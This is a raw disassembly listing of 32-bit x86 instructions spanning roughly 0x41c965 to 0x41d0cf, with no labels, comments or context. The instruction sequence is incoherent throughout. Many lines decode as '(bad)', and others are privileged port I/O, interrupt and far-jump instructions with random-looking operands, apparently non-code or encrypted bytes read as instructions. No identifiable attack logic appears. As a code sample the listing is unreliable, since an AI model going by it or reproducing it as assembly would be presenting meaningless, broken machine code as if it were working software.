  41c965:	pop    es
  41c966:	mov    edi,0x1c5c231e
  41c96b:	mov    ds:0x994d97a4,eax
  41c970:	cmp    bl,BYTE PTR [ebp+0x24]
  41c973:	je     0x41c9db
  41c975:	sub    eax,0x7a0cc1ff
  41c97a:	std    
  41c97b:	add    ch,BYTE PTR [ebx-0x66]
  41c97e:	in     eax,dx
  41c97f:	retf   0x4844
  41c982:	adc    ecx,esp
  41c984:	mov    ah,0xb5
  41c986:	je     0x41c97c
  41c988:	dec    edx
  41c989:	fsub   DWORD PTR [ecx-0x717462d]
  41c98f:	or     al,0xc3
  41c991:	fld    QWORD PTR [ebx+0x61]
  41c994:	cwde   
  41c995:	and    al,0x48
  41c997:	jge    0x41c93d
  41c999:	or     ebp,DWORD PTR [ecx+0x27fd6a11]
  41c99f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a0:	mov    dh,0x11
  41c9a2:	ret    
  41c9a3:	(bad)  
  41c9a4:	cmp    al,0xea
  41c9a6:	clc    
  41c9a7:	push   ebx
  41c9a9:	vorpd  xmm2,xmm5,XMMWORD PTR [ebp+0x2a]
  41c9ae:	and    DWORD PTR [ecx+0x54],esi
  41c9b1:	adc    ch,BYTE PTR [edi+0x709c8d1c]
  41c9b7:	nop
  41c9b8:	loopne 0x41c9df
  41c9ba:	jo     0x41c9b7
  41c9bc:	(bad)  
  41c9bd:	jle    0x41c9d5
  41c9bf:	adc    al,0xc3
  41c9c1:	sub    eax,0xc124c3ef
  41c9c6:	xchg   bp,ax
  41c9c8:	adc    ebx,DWORD PTR [esp+esi*1]
  41c9cb:	push   esi
  41c9cc:	loop   0x41c9ab
  41c9ce:	vmread DWORD PTR [ebp-0x25],ebp
  41c9d2:	jo     0x41ca49
  41c9d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9d5:	ss pop es
  41c9d7:	lods   al,BYTE PTR ds:[esi]
  41c9d8:	je     0x41c980
  41c9da:	and    al,0x36
  41c9dc:	push   ebx
  41c9dd:	mov    BYTE PTR [edx+ebx*1-0x5e0cfa7b],ah
  41c9e4:	lock iret 
  41c9e6:	lahf   
  41c9e7:	mov    bl,0xcd
  41c9e9:	(bad)  
  41c9ea:	ds repz push edx
  41c9ed:	and    DWORD PTR [ecx+0xd7ea452],0xffffff93
  41c9f4:	and    eax,0xe0d0fa9f
  41c9f9:	xchg   ebp,eax
  41c9fa:	sub    DWORD PTR [eax-0x6e],ebx
  41c9fd:	shl    BYTE PTR [edi],0x2e
  41ca00:	outs   dx,DWORD PTR ds:[esi]
  41ca01:	clc    
  41ca02:	pop    eax
  41ca03:	pop    es
  41ca04:	rol    BYTE PTR [ecx-0x7c],0x4d
  41ca08:	ret    
  41ca09:	xchg   ecx,eax
  41ca0a:	jg     0x41ca4c
  41ca0c:	mov    edx,0x6231de0b
  41ca11:	mov    esp,0x6c28633e
  41ca16:	sub    DWORD PTR [esi],esi
  41ca18:	adc    dh,BYTE PTR [ecx+eiz*2]
  41ca1b:	or     cl,BYTE PTR [ebx]
  41ca1d:	ror    BYTE PTR [ecx+0x38],cl
  41ca20:	jge    0x41c9a7
  41ca22:	xchg   ecx,eax
  41ca23:	in     eax,dx
  41ca24:	mov    cl,0x83
  41ca26:	ins    DWORD PTR es:[edi],dx
  41ca27:	iret   
  41ca28:	xchg   edx,eax
  41ca29:	jg     0x41c9fa
  41ca2b:	and    ebp,DWORD PTR [eax+0x59]
  41ca2e:	adc    bl,BYTE PTR [eax]
  41ca30:	xor    BYTE PTR [edx+0x626370d],bh
  41ca36:	fld    QWORD PTR [ebx-0x54b091a8]
  41ca3c:	shr    DWORD PTR [ebp-0x328a9237],cl
  41ca42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca43:	fnsave [eax+0x6c3d6d47]
  41ca49:	push   edi
  41ca4a:	not    WORD PTR [ecx+0x5]
  41ca4e:	cmp    DWORD PTR [ecx],0x1
  41ca51:	add    BYTE PTR [edi],ch
  41ca53:	out    0xa1,eax
  41ca55:	mov    edi,0x45d803cd
  41ca5a:	lods   al,BYTE PTR ds:[esi]
  41ca5b:	ret    
  41ca5c:	mov    esi,0x7f92524
  41ca61:	jp     0x41ca03
  41ca63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca64:	inc    esi
  41ca65:	repnz imul DWORD PTR [esi-0x20]
  41ca69:	pop    ebp
  41ca6a:	lods   eax,DWORD PTR ds:[esi]
  41ca6b:	mov    al,ds:0xb0f917e5
  41ca70:	pop    edi
  41ca71:	mov    dl,0x71
  41ca73:	enter  0xc44b,0xa6
  41ca77:	test   BYTE PTR [ecx+0x6c],dl
  41ca7a:	sub    BYTE PTR [esi-0x3d0b7285],dh
  41ca80:	pop    esi
  41ca81:	jp     0x41ca2d
  41ca83:	pop    esp
  41ca84:	jb     0x41cb03
  41ca86:	daa    
  41ca87:	clc    
  41ca88:	mov    ss,WORD PTR [ebp+0x5a]
  41ca8b:	popf   
  41ca8c:	ficomp DWORD PTR [edi-0x437f263]
  41ca92:	cmp    bl,0x95
  41ca95:	scas   eax,DWORD PTR es:[edi]
  41ca96:	xchg   DWORD PTR [ebx-0x13],eax
  41ca99:	(bad)  
  41ca9a:	lock in al,dx
  41ca9c:	sbb    ebx,0xf882f722
  41caa2:	push   ecx
  41caa3:	or     al,0x21
  41caa5:	scas   al,BYTE PTR es:[edi]
  41caa6:	leave  
  41caa7:	mov    eax,DWORD PTR [eax+eiz*2-0x58c88c5f]
  41caae:	add    eax,0x18a958e5
  41cab3:	pop    ds
  41cab4:	or     eax,0x3c20d582
  41cab9:	cmp    BYTE PTR [ebx],cl
  41cabb:	lods   al,BYTE PTR ds:[esi]
  41cabc:	mov    dh,0x61
  41cabe:	adc    BYTE PTR [edi-0x34f31db],dh
  41cac4:	mov    ebp,0xdcde36e1
  41cac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caca:	rol    BYTE PTR [ebx-0x3edfac4a],cl
  41cad0:	btr    DWORD PTR [eax+edx*4],esp
  41cad4:	out    dx,eax
  41cad5:	loopne 0x41cab6
  41cad7:	mov    ch,0x7f
  41cad9:	shl    BYTE PTR ds:0x64f0b4de,0xa1
  41cae0:	add    ecx,DWORD PTR [edi+0x15]
  41cae3:	popf   
  41cae4:	jb     0x41caec
  41cae6:	xchg   edx,eax
  41cae7:	sub    al,0x2b
  41cae9:	or     esp,DWORD PTR [eax-0x79b51980]
  41caef:	es and ebp,ecx
  41caf2:	loopne 0x41cab0
  41caf4:	xor    edi,eax
  41caf6:	inc    ebx
  41caf7:	or     edx,DWORD PTR ds:0xa25fe812
  41cafd:	xchg   ebp,eax
  41cafe:	and    dl,BYTE PTR [esi-0x543551a5]
  41cb04:	jno    0x41cb4b
  41cb06:	outs   dx,BYTE PTR ds:[esi]
  41cb07:	or     DWORD PTR [edi],edx
  41cb09:	shl    DWORD PTR [edx-0x1a],1
  41cb0c:	xor    DWORD PTR [esi-0x31f0b29f],esp
  41cb12:	fnstsw WORD PTR [ebp-0x4bc8dac7]
  41cb18:	or     BYTE PTR [ecx+0x4f],0xb2
  41cb1c:	push   ebp
  41cb1d:	sub    DWORD PTR [edx+edi*4],ebp
  41cb20:	push   ecx
  41cb21:	mov    WORD PTR [esp+esi*2-0x56f747f3],cs
  41cb28:	fidiv  WORD PTR [ebx+0x553eabd3]
  41cb2e:	mov    WORD PTR [ecx],fs
  41cb30:	or     DWORD PTR [esi],esp
  41cb32:	popf   
  41cb33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb34:	and    DWORD PTR [ecx-0x37e9cf8],ecx
  41cb3a:	cli    
  41cb3b:	or     al,0x20
  41cb3d:	jae    0x41cbb4
  41cb3f:	add    ebx,DWORD PTR [esp+ebp*2-0x61]
  41cb43:	sti    
  41cb44:	mov    edx,0x84da7b5b
  41cb49:	xor    al,0x96
  41cb4b:	gs cmc 
  41cb4d:	mov    ds:0x12ea12f,eax
  41cb52:	ret    0xb759
  41cb55:	sti    
  41cb56:	test   dl,ah
  41cb58:	ficomp DWORD PTR [ebp-0x2d33ae11]
  41cb5e:	jb     0x41cbb5
  41cb60:	push   ebp
  41cb61:	sub    BYTE PTR [edx+0x7f],bh
  41cb64:	jbe    0x41cb54
  41cb66:	scas   eax,DWORD PTR es:[edi]
  41cb67:	lea    ecx,[eax]
  41cb69:	cli    
  41cb6a:	add    edx,ebp
  41cb6c:	(bad)  
  41cb6d:	mov    esi,0x8f8e8ca2
  41cb72:	call   0xcedbd4a8
  41cb77:	outs   dx,DWORD PTR ds:[esi]
  41cb78:	dec    esp
  41cb79:	repnz cli 
  41cb7b:	sbb    al,0xf4
  41cb7d:	std    
  41cb7e:	and    al,0x2e
  41cb80:	jne    0x41cb87
  41cb82:	mov    edi,0xb2529b5f
  41cb87:	fwait
  41cb88:	aas    
  41cb89:	mov    ebp,0x3184bced
  41cb8e:	stc    
  41cb8f:	xor    eax,0x77b08b5c
  41cb94:	xor    al,0xc7
  41cb96:	mov    cl,0x66
  41cb98:	adc    ebx,DWORD PTR [esi-0x61b75ca0]
  41cb9e:	out    dx,al
  41cb9f:	call   0xde39fefe
  41cba4:	mov    DWORD PTR cs:[esp+esi*1-0x31],edi
  41cba9:	mov    BYTE PTR [eax+0x41],ah
  41cbac:	ret    0x6d2e
  41cbaf:	pusha  
  41cbb0:	lea    edx,[esi+0x5c46e139]
  41cbb6:	jb     0x41cb8d
  41cbb8:	mov    dh,0x3e
  41cbba:	xchg   ebx,eax
  41cbbb:	fwait
  41cbbc:	scas   al,BYTE PTR es:[edi]
  41cbbd:	jmp    0xd39c:0x9f9e064f
  41cbc4:	mov    esi,0xef834800
  41cbc9:	adc    esi,edi
  41cbcb:	add    ebx,DWORD PTR [edx-0x3c]
  41cbce:	dec    ah
  41cbd0:	call   0xeb17:0x55b4cae7
  41cbd7:	push   edi
  41cbd8:	mov    al,ds:0x2f2b461e
  41cbdd:	inc    esp
  41cbde:	add    DWORD PTR [edx+ecx*4-0x43aab357],eax
  41cbe5:	(bad)  
  41cbe6:	cmp    ah,BYTE PTR [edi+0x1c]
  41cbe9:	das    
  41cbea:	cli    
  41cbeb:	mov    DWORD PTR [edx-0x5f],ebp
  41cbee:	cmp    BYTE PTR [ecx+ebp*4+0x4f],0x71
  41cbf3:	pop    edi
  41cbf4:	(bad)  
  41cbf5:	outs   dx,DWORD PTR fs:[esi]
  41cbf7:	int3   
  41cbf8:	outs   dx,DWORD PTR ds:[esi]
  41cbf9:	mov    eax,ds:0xdfd3151f
  41cbfe:	test   BYTE PTR ds:0x1e6113e0,0xb2
  41cc05:	outs   dx,BYTE PTR ds:[esi]
  41cc06:	pusha  
  41cc07:	push   es
  41cc08:	sub    al,0x12
  41cc0a:	adc    DWORD PTR [ebx+ecx*8],esp
  41cc0d:	jmp    0xcd50e4b1
  41cc12:	inc    ebp
  41cc13:	loope  0x41cc5f
  41cc15:	loope  0x41cc83
  41cc17:	jnp    0x41cb99
  41cc19:	sub    dh,0x71
  41cc1c:	jmp    0x4a8c:0x217c8337
  41cc23:	stc    
  41cc24:	ret    
  41cc25:	pushf  
  41cc26:	cli    
  41cc27:	out    0xe0,al
  41cc29:	dec    ebx
  41cc2a:	lods   al,BYTE PTR ds:[esi]
  41cc2b:	test   eax,0xbc023218
  41cc30:	ja     0x41cc0a
  41cc32:	lahf   
  41cc33:	ins    DWORD PTR es:[edi],dx
  41cc34:	in     eax,dx
  41cc35:	push   ebp
  41cc36:	lds    ebp,FWORD PTR [edx+0x3e300e65]
  41cc3c:	shl    BYTE PTR [edi-0x17da4a94],0x8c
  41cc43:	ret    0x9845
  41cc46:	xchg   ebx,eax
  41cc47:	or     bl,BYTE PTR [eax+0x29d1e66e]
  41cc4d:	aad    0x4c
  41cc4f:	mov    ds:0x4dd3e11a,eax
  41cc54:	fadd   DWORD PTR [edi]
  41cc56:	imul   ebp,esp,0xde8464c5
  41cc5c:	fs inc ecx
  41cc5e:	push   0xbc968363
  41cc63:	fdiv   QWORD PTR [edx-0x5e]
  41cc66:	sub    al,BYTE PTR [eax+0x677d47c1]
  41cc6c:	mov    bh,0x8e
  41cc6e:	jmp    0x677f1a41
  41cc73:	lahf   
  41cc74:	fadd   st(7),st
  41cc76:	xchg   ecx,eax
  41cc77:	lahf   
  41cc78:	ficom  WORD PTR [esi-0x78]
  41cc7b:	lods   al,BYTE PTR ds:[esi]
  41cc7c:	xor    al,0x69
  41cc7e:	stc    
  41cc7f:	push   eax
  41cc80:	out    0xe9,eax
  41cc82:	dec    eax
  41cc83:	push   ebx
  41cc84:	std    
  41cc85:	hlt    
  41cc86:	int    0xf6
  41cc88:	add    dl,cl
  41cc8a:	pop    esi
  41cc8b:	push   ecx
  41cc8c:	sti    
  41cc8d:	add    ch,BYTE PTR [esi-0x7a]
  41cc90:	dec    ecx
  41cc91:	xchg   ebx,eax
  41cc92:	jno    0x41cc58
  41cc94:	adc    DWORD PTR [esp+eiz*8-0x79],edi
  41cc98:	xor    eax,0x3c501972
  41cc9d:	and    eax,0x10025ca
  41cca2:	mov    DWORD PTR [edx+0x94161fc],esp
  41cca8:	hlt    
  41cca9:	popa   
  41ccaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccab:	add    eax,0xeaa831bf
  41ccb0:	aas    
  41ccb1:	sti    
  41ccb2:	jmp    0x41cd00
  41ccb4:	leave  
  41ccb5:	jp     0x41ccdc
  41ccb7:	mov    ds:0x2099e9a2,al
  41ccbc:	sbb    DWORD PTR [edi-0x4],eax
  41ccbf:	xchg   esp,eax
  41ccc0:	mov    dh,0x96
  41ccc2:	adc    eax,0x8cbe1eee
  41ccc7:	into   
  41ccc8:	(bad)  
  41ccc9:	sub    dh,BYTE PTR [ebx+0x78]
  41cccc:	cmp    esi,ebx
  41ccce:	(bad)  
  41cccf:	push   ss
  41ccd0:	add    DWORD PTR [ebx-0x4900c5e8],eax
  41ccd6:	fisttp DWORD PTR [eax+ecx*2]
  41ccd9:	jmp    0x62b16351
  41ccde:	pop    ebp
  41ccdf:	in     eax,dx
  41cce0:	or     BYTE PTR [ecx-0x7a],al
  41cce3:	ins    BYTE PTR es:[edi],dx
  41cce4:	shr    DWORD PTR [ecx+0x36],cl
  41cce7:	pop    ss
  41cce8:	fidivr DWORD PTR [edi+0x4a830368]
  41ccee:	xor    eax,DWORD PTR [edi*1+0x4c1fb133]
  41ccf5:	fs jp  0x41cc7a
  41ccf8:	out    0x0,eax
  41ccfa:	jb     0x41ccbf
  41ccfc:	rcl    ebx,0x50
  41ccff:	dec    esp
  41cd00:	or     edx,DWORD PTR [ebx-0x4c]
  41cd03:	lea    esi,[edx+0xb73984]
  41cd09:	xor    edi,DWORD PTR [eax+0x77]
  41cd0c:	and    al,0x56
  41cd0e:	dec    ebp
  41cd0f:	test   eax,0x7bc79b8c
  41cd14:	and    BYTE PTR [ebp*2+0x93a8a25],dh
  41cd1b:	xchg   DWORD PTR [eax+eax*1],ebx
  41cd1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd1f:	cdq    
  41cd20:	or     esi,DWORD PTR [edx-0x1c]
  41cd23:	sbb    BYTE PTR [edi+0x4e],cl
  41cd26:	stos   BYTE PTR es:[edi],al
  41cd27:	or     ebx,edx
  41cd29:	pushf  
  41cd2a:	xor    BYTE PTR [eax-0x37a05f7c],0xee
  41cd31:	outs   dx,DWORD PTR ds:[esi]
  41cd32:	inc    ebx
  41cd33:	add    edi,eax
  41cd35:	lahf   
  41cd36:	mov    dh,0xf6
  41cd38:	sbb    esp,0xeb30e44f
  41cd3e:	or     BYTE PTR [ecx+0x2e405512],cl
  41cd44:	adc    eax,0xebf9ab6f
  41cd49:	sub    BYTE PTR [eax],bl
  41cd4b:	sbb    DWORD PTR [ecx+0x473d3e6],0x61
  41cd52:	inc    eax
  41cd53:	inc    ecx
  41cd54:	inc    esi
  41cd55:	xchg   edi,eax
  41cd56:	in     eax,dx
  41cd57:	repnz out dx,al
  41cd59:	into   
  41cd5a:	pop    ds
  41cd5b:	mov    eax,ds:0x77182ac8
  41cd60:	cdq    
  41cd61:	jnp    0x41cd26
  41cd63:	sub    dl,bh
  41cd65:	(bad)  
  41cd66:	adc    al,cl
  41cd68:	adc    eax,0xf10dcd55
  41cd6d:	sub    eax,0xa6881881
  41cd72:	fld    DWORD PTR [ebx]
  41cd74:	ror    DWORD PTR [ebx-0x7f5f4e0f],cl
  41cd7a:	loope  0x41cde0
  41cd7c:	test   ah,0x36
  41cd7f:	pop    esp
  41cd80:	shl    BYTE PTR [ecx],cl
  41cd82:	sub    eax,0x69529df9
  41cd87:	inc    ebx
  41cd88:	cs or  edi,edi
  41cd8b:	mov    dl,0xd6
  41cd8d:	jb     0x41cd86
  41cd8f:	cmp    DWORD PTR [edi],ecx
  41cd91:	mov    esp,0x62dd3e96
  41cd96:	gs mov bh,0x1d
  41cd99:	jns    0x41cdfe
  41cd9b:	rcr    BYTE PTR [edx-0x3ae00fa],1
  41cda1:	pop    edi
  41cda2:	inc    eax
  41cda3:	ficom  DWORD PTR [ebx-0x24b6f7a2]
  41cda9:	mov    ds:0x7d35b264,al
  41cdae:	xor    al,0xb7
  41cdb0:	rcl    ch,1
  41cdb2:	pop    ecx
  41cdb3:	iret   
  41cdb4:	ja     0x41cda7
  41cdb6:	ret    0x3c94
  41cdb9:	add    al,0xff
  41cdbb:	xor    eax,0x80558e7c
  41cdc0:	and    DWORD PTR [edi],0x20
  41cdc3:	(bad)  
  41cdc4:	loopne 0x41ce2d
  41cdc6:	cmp    eax,DWORD PTR [eax]
  41cdc8:	retf   
  41cdc9:	enter  0x65a9,0xcc
  41cdcd:	(bad)
  41cdd1:	and    bl,0x2a
  41cdd4:	(bad)  [eax]
  41cdd6:	imul   edi,ecx,0x2233fcb2
  41cddc:	cld    
  41cddd:	test   BYTE PTR [edx],0x4
  41cde0:	jmp    0x3434d4c5
  41cde5:	data16 add al,0x97
  41cde8:	leave  
  41cde9:	jbe    0x41cdc4
  41cdeb:	jp     0x41cdaa
  41cded:	mov    ds:0x8adc8568,eax
  41cdf2:	cmp    al,0xa2
  41cdf4:	outs   dx,BYTE PTR ds:[esi]
  41cdf5:	add    bl,BYTE PTR [eax-0x46]
  41cdf8:	jmp    0x41cdc1
  41cdfa:	enter  0xdbf7,0xf
  41cdfe:	xor    eax,0xf2a0bd18
  41ce03:	xchg   edi,eax
  41ce04:	pop    edx
  41ce05:	cvtps2pi mm3,QWORD PTR [eax]
  41ce08:	enter  0x8f54,0x8b
  41ce0c:	inc    esp
  41ce0d:	lods   al,BYTE PTR ds:[esi]
  41ce0e:	mov    edi,0x61aba7a2
  41ce13:	je     0x41cda9
  41ce15:	pop    ds
  41ce16:	outs   dx,BYTE PTR ss:[esi]
  41ce18:	in     eax,dx
  41ce19:	out    0x47,al
  41ce1b:	push   0x7a
  41ce1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce1e:	jnp    0x41ce0c
  41ce20:	sbb    eax,0xb7ed4f45
  41ce25:	jns    0x41ce6a
  41ce27:	xchg   esp,eax
  41ce28:	mov    eax,ds:0x668d8c0d
  41ce2d:	inc    edx
  41ce2e:	jbe    0x41cde8
  41ce30:	stos   DWORD PTR es:[edi],eax
  41ce31:	inc    ebx
  41ce32:	imul   esi,DWORD PTR [ebp+0x1a],0xe1fce68b
  41ce39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce3a:	xor    BYTE PTR [eax+0x2d0293f0],al
  41ce40:	and    al,0x36
  41ce42:	jb     0x41ce8f
  41ce44:	popf   
  41ce45:	arpl   WORD PTR [edx+0x309bb2b1],cx
  41ce4b:	cli    
  41ce4c:	fldenv es:[ebp-0x5282cefa]
  41ce53:	test   BYTE PTR [eax+0x51077c15],al
  41ce59:	ret    0x5c21
  41ce5c:	mov    esp,0x7d9eef8d
  41ce61:	fcomp  QWORD PTR [esi+0x73]
  41ce64:	inc    esp
  41ce65:	inc    DWORD PTR [edi+0x2b764a1c]
  41ce6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce6c:	pop    ds
  41ce6d:	xor    eax,0x881257
  41ce72:	cmp    DWORD PTR [edx+0x76],edi
  41ce75:	loope  0x41ce95
  41ce77:	gs cmp al,0x8d
  41ce7a:	in     eax,0x7d
  41ce7c:	fucom  st(3)
  41ce7e:	mov    ch,0xe8
  41ce80:	addr16 sub eax,esi
  41ce83:	repnz adc al,0xcf
  41ce86:	inc    edx
  41ce87:	mov    cl,0xb
  41ce89:	lods   eax,DWORD PTR ds:[esi]
  41ce8a:	pop    esp
  41ce8b:	call   0x6edab5e
  41ce90:	or     bl,BYTE PTR [ebx]
  41ce92:	out    dx,eax
  41ce93:	pop    esp
  41ce94:	inc    ebx
  41ce95:	mov    edi,0x19423ae7
  41ce9a:	arpl   WORD PTR [eax+edx*4+0x2c96b8cd],bp
  41cea1:	pop    ecx
  41cea2:	test   eax,0x5d48fc34
  41cea7:	mov    edi,0x8d11122a
  41ceac:	jns    0x41cf09
  41ceae:	pop    es
  41ceaf:	(bad)  
  41ceb0:	pop    eax
  41ceb1:	cmp    ecx,DWORD PTR [ecx+0x60]
  41ceb4:	loop   0x41ce9a
  41ceb6:	jp     0x41ce7a
  41ceb8:	cmp    esi,DWORD PTR [ebx+0x5f]
  41cebb:	pop    eax
  41cebc:	es xor esp,edi
  41cebf:	sbb    BYTE PTR [ebp-0x28f81a8c],ch
  41cec5:	pop    eax
  41cec6:	(bad)  
  41cec7:	int3   
  41cec8:	outs   dx,DWORD PTR ds:[esi]
  41cec9:	sub    al,0x81
  41cecb:	dec    eax
  41cecc:	cmp    eax,esp
  41cece:	mov    ds,sp
  41ced1:	mov    eax,0x2fbf2238
  41ced6:	loop   0x41ce66
  41ced8:	mov    ds:0x3304a497,eax
  41cedd:	(bad)  
  41cede:	xor    bh,ah
  41cee0:	pop    ss
  41cee1:	inc    ebp
  41cee2:	jmp    0x41cf5d
  41cee4:	xchg   ebx,eax
  41cee5:	lods   eax,DWORD PTR ds:[esi]
  41cee6:	add    esi,DWORD PTR [ecx]
  41cee8:	adc    edi,DWORD PTR [edi]
  41ceea:	icebp  
  41ceeb:	out    0x63,eax
  41ceed:	jb     0x41cebf
  41ceef:	sbb    ecx,ebx
  41cef1:	std    
  41cef2:	cmp    BYTE PTR [esi-0x4208137b],0x49
  41cef9:	cli    
  41cefa:	mov    esi,DWORD PTR [eax]
  41cefc:	pop    esp
  41cefd:	fcom   QWORD PTR [eax-0x6e]
  41cf00:	daa    
  41cf01:	cmp    al,0xd5
  41cf03:	stc    
  41cf04:	lahf   
  41cf05:	sub    DWORD PTR [edx-0x6184efee],edx
  41cf0b:	cmp    al,0xd3
  41cf0d:	mov    eax,0x14a0353d
  41cf12:	pop    ds
  41cf13:	mov    ah,0xa7
  41cf15:	jmp    0x41cee8
  41cf17:	mov    esi,0xdb435903
  41cf1c:	xor    eax,0xb84b936c
  41cf21:	sub    BYTE PTR [ecx],ch
  41cf23:	rcr    BYTE PTR [ecx+0x3],0x5
  41cf27:	mov    BYTE PTR [esi],bh
  41cf29:	out    0xdf,eax
  41cf2b:	sub    dl,BYTE PTR [eax+0x49]
  41cf2e:	sub    bl,ah
  41cf30:	ins    DWORD PTR es:[edi],dx
  41cf31:	shl    bh,cl
  41cf33:	cmp    DWORD PTR [eax+0x6a],edi
  41cf36:	daa    
  41cf37:	mov    edi,0x5af7b7b4
  41cf3c:	xchg   edi,eax
  41cf3d:	outs   dx,DWORD PTR ds:[esi]
  41cf3e:	div    DWORD PTR [ebp+edi*8-0x75e60cdf]
  41cf45:	fwait
  41cf46:	jnp    0x41cf65
  41cf48:	sbb    DWORD PTR ds:0x8df680b3,ecx
  41cf4e:	test   ebp,ecx
  41cf50:	dec    edx
  41cf51:	loopne 0x41cfa4
  41cf53:	add    al,0xe9
  41cf55:	ret    
  41cf56:	adc    BYTE PTR [eax+eiz*2],0xf4
  41cf5a:	push   ds
  41cf5b:	jecxz  0x41cf30
  41cf5d:	xchg   dl,dl
  41cf5f:	inc    esp
  41cf60:	fs push ds
  41cf62:	ja     0x41cf7d
  41cf64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf65:	icebp  
  41cf66:	adc    BYTE PTR [ecx],cl
  41cf68:	mov    al,0x5c
  41cf6a:	sbb    dl,dh
  41cf6c:	pop    ebx
  41cf6d:	fist   DWORD PTR [ebp+esi*4-0x4e]
  41cf71:	push   ds
  41cf72:	neg    BYTE PTR [esi]
  41cf74:	stc    
  41cf75:	push   edi
  41cf76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf77:	jae    0x41cf44
  41cf79:	retf   0x869a
  41cf7c:	pop    esi
  41cf7d:	mov    cl,0xf1
  41cf7f:	or     eax,0x8d15471f
  41cf84:	daa    
  41cf85:	mov    ds:0x9dc881f3,al
  41cf8a:	xor    eax,0xcb00f345
  41cf8f:	leave  
  41cf90:	aam    0x42
  41cf92:	xchg   ecx,eax
  41cf93:	stos   BYTE PTR es:[edi],al
  41cf94:	xor    ebx,DWORD PTR [edi-0x62]
  41cf97:	sbb    ecx,DWORD PTR [ebx]
  41cf99:	push   ecx
  41cf9a:	sub    ebp,DWORD PTR [edx]
  41cf9c:	dec    ecx
  41cf9d:	jo     0x41cf6d
  41cf9f:	mov    esi,0x6c568c41
  41cfa4:	loope  0x41d002
  41cfa6:	push   cs
  41cfa7:	jl     0x41cf34
  41cfa9:	jne    0x41d027
  41cfab:	dec    esi
  41cfac:	in     eax,0xb5
  41cfae:	leave  
  41cfaf:	inc    edi
  41cfb0:	neg    DWORD PTR [ecx+0xf]
  41cfb3:	loope  0x41cf4e
  41cfb5:	div    BYTE PTR [ebx+esi*2-0x269e4b62]
  41cfbc:	stos   BYTE PTR es:[edi],al
  41cfbd:	fwait
  41cfbe:	shl    ch,cl
  41cfc0:	fcmovb st,st(4)
  41cfc2:	mov    dl,0x4e
  41cfc4:	dec    edx
  41cfc5:	fcom   DWORD PTR [edx]
  41cfc7:	pop    ebp
  41cfc8:	and    esi,DWORD PTR [edi+0x57]
  41cfcb:	ins    BYTE PTR es:[edi],dx
  41cfcc:	outs   dx,BYTE PTR ds:[esi]
  41cfcd:	adc    eax,0x390beadb
  41cfd2:	mov    ds:0xcfa5c06,al
  41cfd7:	fiadd  WORD PTR [edx+ebx*1]
  41cfda:	mov    al,0xfb
  41cfdc:	xchg   edi,eax
  41cfdd:	dec    edi
  41cfde:	outs   dx,DWORD PTR ds:[esi]
  41cfdf:	sub    al,0x54
  41cfe1:	xor    dl,BYTE PTR [ecx+0x34]
  41cfe4:	ss pop DWORD PTR ss:[ecx+0x66ad952f]
  41cfec:	sub    eax,0x5dd6d7e6
  41cff1:	mov    DWORD PTR [eax-0xfa6fb2a],eax
  41cff7:	lea    ebp,[ecx]
  41cff9:	and    eax,0xed9bd956
  41cffe:	icebp  
  41cfff:	dec    ebx
  41d000:	xchg   esi,eax
  41d001:	sbb    eax,0x29b1d459
  41d006:	and    cl,BYTE PTR [esi+0x1326685c]
  41d00c:	loop   0x41d08c
  41d00e:	jle    0x41cfd7
  41d010:	push   ds
  41d011:	xchg   ecx,eax
  41d012:	push   ebp
  41d013:	push   ss
  41d014:	add    esi,0xffffff93
  41d017:	xor    al,0xa4
  41d019:	sub    ecx,DWORD PTR ds:0xe4613059
  41d01f:	retf   
  41d020:	push   eax
  41d021:	int    0x50
  41d023:	jo     0x41cfc3
  41d025:	sbb    al,0xc6
  41d028:	adc    ah,BYTE PTR [edx]
  41d02a:	pop    eax
  41d02b:	call   0x7e3fe144
  41d030:	mov    edx,0xafd523af
  41d035:	leave  
  41d036:	retf   
  41d037:	loope  0x41cfd9
  41d039:	adc    DWORD PTR [esi+0x10425954],eax
  41d03f:	adc    BYTE PTR [ebp+0x640cf2a4],0xa1
  41d046:	push   esp
  41d047:	(bad)  
  41d048:	stos   BYTE PTR es:[edi],al
  41d049:	xchg   DWORD PTR [edi+0x1110dd23],ecx
  41d04f:	outs   dx,DWORD PTR ds:[esi]
  41d050:	or     DWORD PTR [edi+ebp*1-0x55],ebx
  41d054:	mov    bh,0x25
  41d056:	mov    DWORD PTR [ebx+0x75],esi
  41d059:	mov    eax,0x7200a246
  41d05e:	sub    al,0x34
  41d060:	repz ret 0xc64c
  41d064:	fisub  WORD PTR [ebp+0x52fe216e]
  41d06a:	pop    esi
  41d06b:	pop    ebx
  41d06c:	lahf   
  41d06d:	sbb    BYTE PTR [edx+0xf],0xac
  41d071:	sbb    ebp,DWORD PTR [ebx-0x46]
  41d074:	repz test BYTE PTR ds:0xca6a1021,dh
  41d07b:	fnstenv [edx+0x60ae4c27]
  41d081:	test   eax,0xc75d40c7
  41d086:	sbb    al,dl
  41d088:	loop   0x41d046
  41d08a:	pushf  
  41d08b:	jmp    0x1b80:0x7bd17d28
  41d092:	mov    ds:0x55933204,al
  41d097:	ins    DWORD PTR es:[edi],dx
  41d098:	and    BYTE PTR [ebx+edi*4-0x7ed4cdf5],0x19
  41d0a0:	sbb    DWORD PTR [edx+ecx*1-0x2d71feb0],edx
  41d0a7:	loop   0x41d079
  41d0a9:	xor    eax,0x64cd38f6
  41d0ae:	cmp    eax,DWORD PTR [ebp+0x93bf0b]
  41d0b4:	ret    0xfabe
  41d0b7:	repnz and eax,0x9ddf2495
  41d0be:	mov    edi,0x40c4d62a
  41d0c3:	in     al,0xe7
  41d0c5:	lds    eax,FWORD PTR [ebp+0x356d8305]
  41d0cb:	pop    edi
  41d0cc:	clc    
  41d0cd:	jbe    0x41d0fe
  41d0cf:	call   0x2ec94a71
